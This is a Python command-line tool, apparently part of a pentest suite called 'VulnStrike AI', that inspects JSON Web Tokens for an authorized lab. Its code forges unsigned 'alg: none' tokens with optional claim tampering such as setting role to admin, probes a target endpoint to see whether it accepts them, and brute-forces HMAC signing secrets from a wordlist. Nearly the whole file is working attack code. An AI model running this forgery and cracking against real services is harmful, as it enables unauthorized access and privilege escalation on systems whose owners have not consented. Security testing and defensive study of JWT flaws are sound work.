#!/usr/bin/env python3
"""VulnStrike AI — Subsystem 3.2: JWT Security Inspector.

Performs three modular security checks on JSON Web Tokens used by an authorized
lab application:
  1. Unverified inspection: decodes and reports the raw JWT header, payload
     claims, signature presence, and claim-level security observations.
  2. ``"alg": "none"`` verification: crafts unsecured JWT variants (``none``,
     ``None``, ``NONE``, trailing-dot and dotless forms) and tests whether the
     target API endpoint accepts them after validating baseline rejection of a
     corrupted signature.
  3. Dictionary secret guessing: tests symmetric HMAC tokens (``HS256``,
     ``HS384``, ``HS512``) against a provided wordlist using ``PyJWT``.
"""

from __future__ import annotations

import argparse
import base64
from datetime import datetime, timezone
import json
import logging
from pathlib import Path
import sys
import time
from typing import Any
import warnings

import jwt
from jwt.exceptions import InvalidSignatureError, InvalidTokenError
import requests

LOGGER = logging.getLogger("vulnstrike.jwt_inspector")

SUPPORTED_HMAC_ALGS: frozenset[str] = frozenset({"HS256", "HS384", "HS512"})


def _b64url_encode(raw: bytes) -> str:
    """Encode bytes as unpadded RFC 7515 Base64URL ASCII string."""
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def _b64url_decode(segment: str) -> bytes:
    """Decode an unpadded RFC 7515 Base64URL string into raw bytes."""
    padding = "=" * ((4 - len(segment) % 4) % 4)
    return base64.urlsafe_b64decode(segment + padding)


def normalize_raw_token(raw_token: str) -> str:
    """Strip whitespace and optional ``Bearer `` prefix from a raw JWT string."""
    cleaned = raw_token.strip()
    if cleaned.lower().startswith("bearer "):
        cleaned = cleaned[7:].strip()
    return cleaned


def decode_jwt_unverified(token: str) -> dict[str, Any]:
    """Decode a JWT header and payload without verifying its cryptographic signature.

    Uses ``PyJWT`` with a Base64URL fallback for non-standard lab headers, and
    annotates claim hygiene issues (such as missing ``exp`` or ``alg=none``).

    Args:
        token: Raw JWT string (with or without ``Bearer `` prefix).

    Returns:
        Dictionary containing ``header``, ``payload``, ``signature_present``,
        ``signature_segment``, and ``observations``.
    """
    clean_token = normalize_raw_token(token)
    parts = clean_token.split(".")
    if len(parts) not in {2, 3}:
        raise ValueError(
            f"Malformed JWT: expected 2 or 3 dot-separated segments, got {len(parts)}"
        )

    try:
        header = dict(jwt.get_unverified_header(clean_token))
    except InvalidTokenError:
        header = json.loads(_b64url_decode(parts[0]).decode("utf-8"))

    try:
        payload = jwt.decode(
            clean_token,
            options={
                "verify_signature": False,
                "verify_exp": False,
                "verify_nbf": False,
                "verify_iat": False,
                "verify_aud": False,
                "verify_iss": False,
            },
        )
    except InvalidTokenError:
        payload = json.loads(_b64url_decode(parts[1]).decode("utf-8"))

    sig_segment = parts[2] if len(parts) == 3 else ""
    signature_present = bool(sig_segment)

    observations: list[str] = []
    alg = str(header.get("alg", ""))
    if alg.lower() == "none":
        observations.append("Token header already specifies unsecured algorithm 'none'.")
    elif alg in SUPPORTED_HMAC_ALGS:
        observations.append(
            f"Token uses symmetric HMAC ({alg}); susceptible to offline secret guessing if weak."
        )

    if isinstance(payload, dict):
        if "exp" not in payload:
            observations.append("Missing 'exp' expiration claim (token never expires).")
        elif isinstance(payload["exp"], (int, float)):
            now_ts = datetime.now(tz=timezone.utc).timestamp()
            if payload["exp"] < now_ts:
                observations.append("Token 'exp' timestamp is currently expired.")

    return {
        "header": header,
        "payload": payload,
        "signature_present": signature_present,
        "signature_segment": sig_segment,
        "observations": observations,
    }


def build_alg_none_variants(
    header: dict[str, Any],
    payload: dict[str, Any],
    *,
    claim_overrides: dict[str, Any] | None = None,
) -> list[dict[str, str]]:
    """Generate ``alg: none`` JWT variants for server acceptance testing.

    Creates lowercase/mixed/uppercase ``none`` algorithm headers in both RFC
    7515 trailing-dot (``header.payload.``) and stripped-dot (``header.payload``)
    serializations.

    Args:
        header: Original decoded JWT header dictionary.
        payload: Original decoded JWT payload dictionary.
        claim_overrides: Optional claim modifications (e.g., ``{"role": "admin"}``).

    Returns:
        List of dicts with ``variant`` name and forged ``token`` string.
    """
    effective_payload = dict(payload)
    if claim_overrides:
        effective_payload.update(claim_overrides)

    payload_b64 = _b64url_encode(
        json.dumps(effective_payload, separators=(",", ":")).encode("utf-8")
    )

    variants: list[dict[str, str]] = []
    for alg_label in ("none", "None", "NONE"):
        forged_header = dict(header)
        forged_header["alg"] = alg_label
        header_b64 = _b64url_encode(
            json.dumps(forged_header, separators=(",", ":")).encode("utf-8")
        )
        variants.append(
            {
                "variant": f"alg={alg_label} (trailing_dot)",
                "token": f"{header_b64}.{payload_b64}.",
            }
        )
        variants.append(
            {
                "variant": f"alg={alg_label} (no_trailing_dot)",
                "token": f"{header_b64}.{payload_b64}",
            }
        )

    return variants


def corrupt_token_signature(token: str) -> str:
    """Produce a token with an intentionally invalid signature for baseline checks."""
    clean_token = normalize_raw_token(token)
    parts = clean_token.split(".")
    if len(parts) < 3 or not parts[2]:
        return f"{parts[0]}.{parts[1]}.invalidsignatureXYZ123"

    sig = parts[2]
    flipped_char = "A" if sig[0] != "A" else "B"
    tampered_sig = flipped_char + sig[1:-1] + ("Z" if sig[-1] != "Z" else "Y")
    return f"{parts[0]}.{parts[1]}.{tampered_sig}"


def _send_token_probe(
    session: requests.Session,
    endpoint_url: str,
    token: str,
    *,
    method: str = "GET",
    cookie_name: str | None = None,
    header_name: str = "Authorization",
    header_prefix: str = "Bearer ",
    timeout_sec: float = 10.0,
    verify_tls: bool = True,
) -> dict[str, Any]:
    """Send a single HTTP probe carrying ``token`` via header and/or cookie."""
    headers: dict[str, str] = {"Accept": "application/json, text/html;q=0.9, */*;q=0.8"}
    cookies: dict[str, str] = {}

    if header_name:
        headers[header_name] = f"{header_prefix}{token}"
    if cookie_name:
        cookies[cookie_name] = token

    resp = session.request(
        method=method.upper(),
        url=endpoint_url,
        headers=headers,
        cookies=cookies if cookies else None,
        timeout=timeout_sec,
        verify=verify_tls,
        allow_redirects=False,
    )
    return {
        "status_code": resp.status_code,
        "body_preview": resp.text[:240],
        "content_length": len(resp.content),
    }


def test_alg_none_acceptance(
    endpoint_url: str,
    original_token: str,
    header: dict[str, Any],
    payload: dict[str, Any],
    *,
    claim_overrides: dict[str, Any] | None = None,
    method: str = "GET",
    cookie_name: str | None = None,
    timeout_sec: float = 10.0,
    verify_tls: bool = True,
) -> dict[str, Any]:
    """Test whether ``endpoint_url`` accepts JWTs forged with ``"alg": "none"``.

    Verifies both an authenticated baseline (original token) and a negative
    baseline (corrupted signature) before testing ``alg: none`` variants so
    unprotected public routes are not misreported as JWT bypasses.

    Args:
        endpoint_url: Protected API URL used to test token validation.
        original_token: Original valid JWT string.
        header: Decoded JWT header.
        payload: Decoded JWT payload.
        claim_overrides: Optional payload overrides applied to forged tokens.
        method: HTTP verb for ``endpoint_url`` (default: ``GET``).
        cookie_name: Optional cookie name if the hybrid app reads JWTs from cookies.
        timeout_sec: HTTP timeout in seconds.
        verify_tls: Verify SSL certificates.

    Returns:
        Dictionary summarizing baseline statuses, tested variants, and verdict.
    """
    clean_token = normalize_raw_token(original_token)
    variants = build_alg_none_variants(
        header, payload, claim_overrides=claim_overrides
    )

    with requests.Session() as session:
        valid_probe = _send_token_probe(
            session,
            endpoint_url,
            clean_token,
            method=method,
            cookie_name=cookie_name,
            timeout_sec=timeout_sec,
            verify_tls=verify_tls,
        )
        corrupt_probe = _send_token_probe(
            session,
            endpoint_url,
            corrupt_token_signature(clean_token),
            method=method,
            cookie_name=cookie_name,
            timeout_sec=timeout_sec,
            verify_tls=verify_tls,
        )

        # Ensure corrupted signatures are actually rejected before claiming alg:none bypass
        enforces_signature = not (
            200 <= corrupt_probe["status_code"] < 300
            and corrupt_probe["body_preview"] == valid_probe["body_preview"]
        )

        accepted_variants: list[dict[str, Any]] = []
        probe_results: list[dict[str, Any]] = []

        for item in variants:
            res = _send_token_probe(
                session,
                endpoint_url,
                item["token"],
                method=method,
                cookie_name=cookie_name,
                timeout_sec=timeout_sec,
                verify_tls=verify_tls,
            )
            accepted = (
                enforces_signature
                and 200 <= res["status_code"] < 300
                and res["status_code"] != corrupt_probe["status_code"]
            )
            record = {
                "variant": item["variant"],
                "forged_token": item["token"],
                "status_code": res["status_code"],
                "accepted": accepted,
                "body_preview": res["body_preview"],
            }
            probe_results.append(record)
            if accepted:
                accepted_variants.append(record)

    return {
        "tested": True,
        "endpoint_url": endpoint_url,
        "enforces_signature_baseline": enforces_signature,
        "valid_token_status": valid_probe["status_code"],
        "corrupted_signature_status": corrupt_probe["status_code"],
        "vulnerable": len(accepted_variants) > 0,
        "accepted_variants": accepted_variants,
        "all_probes": probe_results,
    }


def guess_hmac_secret(
    token: str,
    wordlist_path: Path,
    *,
    algorithm: str | None = None,
) -> dict[str, Any]:
    """Attempt offline dictionary secret guessing against an HMAC-signed JWT.

    Uses ``PyJWT`` signature verification while ignoring ``exp``/``aud``/``iss``
    claim failures so expired lab tokens can still have their signing secret
    verified accurately.

    Args:
        token: Raw JWT string to test.
        wordlist_path: Path to newline-delimited candidate secret wordlist.
        algorithm: Explicit HMAC algorithm override (defaults to JWT header ``alg``).

    Returns:
        Dictionary containing ``attempted``, ``cracked``, ``secret``,
        ``algorithm``, ``attempts``, and ``elapsed_ms``.
    """
    clean_token = normalize_raw_token(token)
    header = decode_jwt_unverified(clean_token)["header"]
    alg = (algorithm or str(header.get("alg", ""))).upper()

    if alg not in SUPPORTED_HMAC_ALGS:
        return {
            "attempted": False,
            "cracked": False,
            "secret": None,
            "algorithm": alg,
            "attempts": 0,
            "elapsed_ms": 0.0,
            "reason": (
                f"Algorithm {alg!r} is not a symmetric HMAC algorithm "
                f"({sorted(SUPPORTED_HMAC_ALGS)})."
            ),
        }

    if not wordlist_path.is_file():
        raise FileNotFoundError(f"Wordlist file not found: {wordlist_path}")

    decode_opts = {
        "verify_signature": True,
        "verify_exp": False,
        "verify_nbf": False,
        "verify_iat": False,
        "verify_aud": False,
        "verify_iss": False,
    }

    start = time.perf_counter()
    attempts = 0
    matched_secret: str | None = None

    with warnings.catch_warnings():
        # Suppress PyJWT RFC 7518 short-key warnings during dictionary iteration
        warnings.simplefilter("ignore")

        # Stream wordlist line-by-line, skipping blank lines (PyJWT rejects empty HMAC keys)
        candidates_seen: set[str] = set()

        def _try_candidate(secret: str) -> bool:
            nonlocal attempts
            attempts += 1
            try:
                jwt.decode(
                    clean_token,
                    key=secret,
                    algorithms=[alg],
                    options=decode_opts,
                )
                return True
            except (InvalidSignatureError, InvalidTokenError, ValueError):
                return False

        with wordlist_path.open("r", encoding="utf-8", errors="replace") as handle:
            for raw_line in handle:
                candidate = raw_line.rstrip("\r\n")
                if not candidate or candidate in candidates_seen:
                    continue
                candidates_seen.add(candidate)
                if _try_candidate(candidate):
                    matched_secret = candidate
                    break

    elapsed_ms = round((time.perf_counter() - start) * 1000.0, 2)
    return {
        "attempted": True,
        "cracked": matched_secret is not None,
        "secret": matched_secret,
        "algorithm": alg,
        "wordlist": str(wordlist_path),
        "attempts": attempts,
        "elapsed_ms": elapsed_ms,
    }


def inspect_jwt(
    token: str,
    *,
    endpoint_url: str | None = None,
    wordlist_path: Path | None = None,
    claim_overrides: dict[str, Any] | None = None,
    method: str = "GET",
    cookie_name: str | None = None,
    timeout_sec: float = 10.0,
    verify_tls: bool = True,
) -> dict[str, Any]:
    """Run full JWT security inspection (decode + ``alg:none`` + secret guess).

    Args:
        token: Raw JWT string.
        endpoint_url: Optional protected API endpoint to test ``alg: none``.
        wordlist_path: Optional path to candidate secrets wordlist.
        claim_overrides: Optional JSON dict of claims to override on ``alg:none`` probes.
        method: HTTP verb for ``endpoint_url`` probes.
        cookie_name: Optional cookie name for hybrid cookie-based JWT transport.
        timeout_sec: HTTP timeout in seconds.
        verify_tls: Verify SSL certificates when probing ``endpoint_url``.

    Returns:
        Structured JSON-serializable report dictionary.
    """
    decoded = decode_jwt_unverified(token)

    if endpoint_url:
        alg_none_result = test_alg_none_acceptance(
            endpoint_url,
            token,
            decoded["header"],
            decoded["payload"],
            claim_overrides=claim_overrides,
            method=method,
            cookie_name=cookie_name,
            timeout_sec=timeout_sec,
            verify_tls=verify_tls,
        )
    else:
        alg_none_result = {
            "tested": False,
            "vulnerable": False,
            "reason": "No --endpoint provided; generated offline alg:none tokens only.",
            "offline_tokens": build_alg_none_variants(
                decoded["header"],
                decoded["payload"],
                claim_overrides=claim_overrides,
            ),
        }

    if wordlist_path is not None:
        secret_result = guess_hmac_secret(token, wordlist_path)
    else:
        secret_result = {
            "attempted": False,
            "cracked": False,
            "secret": None,
            "reason": "No --wordlist provided.",
        }

    return {
        "module": "jwt_inspector",
        "decoded": {
            "header": decoded["header"],
            "payload": decoded["payload"],
            "signature_present": decoded["signature_present"],
            "observations": decoded["observations"],
        },
        "alg_none_test": alg_none_result,
        "secret_guessing": secret_result,
    }


def save_json_output(data: dict[str, Any], output_path: Path) -> None:
    """Write JWT inspection report to ``output_path`` as formatted JSON."""
    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_text(
        json.dumps(data, indent=2, ensure_ascii=False) + "\n",
        encoding="utf-8",
    )


def build_arg_parser() -> argparse.ArgumentParser:
    """Create CLI argument parser for standalone JWT inspection."""
    parser = argparse.ArgumentParser(
        description="VulnStrike AI — Subsystem 3.2: JWT Security Inspector",
    )
    parser.add_argument(
        "--token",
        required=True,
        help="Raw JWT string to inspect (with or without 'Bearer ' prefix)",
    )
    parser.add_argument(
        "--endpoint",
        default=None,
        help="Protected API URL to test 'alg: none' token acceptance",
    )
    parser.add_argument(
        "--method",
        default="GET",
        help="HTTP method for --endpoint probes (default: GET)",
    )
    parser.add_argument(
        "--cookie-name",
        default=None,
        help="Optional cookie name if target also reads JWTs from a cookie",
    )
    parser.add_argument(
        "--tamper-claims",
        default=None,
        help='Optional JSON object of claim overrides for alg:none test, e.g., \'{"role":"admin"}\'',
    )
    parser.add_argument(
        "--wordlist",
        type=Path,
        default=None,
        help="Path to dictionary wordlist file for PyJWT HMAC secret guessing",
    )
    parser.add_argument(
        "--insecure",
        action="store_true",
        help="Disable TLS certificate verification for self-signed lab endpoints",
    )
    parser.add_argument(
        "--output",
        type=Path,
        default=Path("output/jwt_report.json"),
        help="Output JSON report path (default: output/jwt_report.json)",
    )
    parser.add_argument("--verbose", action="store_true", help="Enable debug logging")
    return parser


def main(argv: list[str] | None = None) -> int:
    """CLI entrypoint for standalone execution."""
    args = build_arg_parser().parse_args(argv)
    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="[%(levelname)s] %(name)s: %(message)s",
    )

    try:
        overrides: dict[str, Any] | None = (
            json.loads(args.tamper_claims) if args.tamper_claims else None
        )
        report = inspect_jwt(
            args.token,
            endpoint_url=args.endpoint,
            wordlist_path=args.wordlist,
            claim_overrides=overrides,
            method=args.method,
            cookie_name=args.cookie_name,
            verify_tls=not args.insecure,
        )
        save_json_output(report, args.output)
        LOGGER.info(
            "JWT inspection saved to %s (alg_none_vulnerable=%s, secret_cracked=%s)",
            args.output,
            report["alg_none_test"].get("vulnerable", False),
            report["secret_guessing"].get("cracked", False),
        )
        return 0
    except Exception as exc:  # noqa: BLE001
        LOGGER.error("JWT Inspector failed: %s", exc)
        return 1


if __name__ == "__main__":
    sys.exit(main())
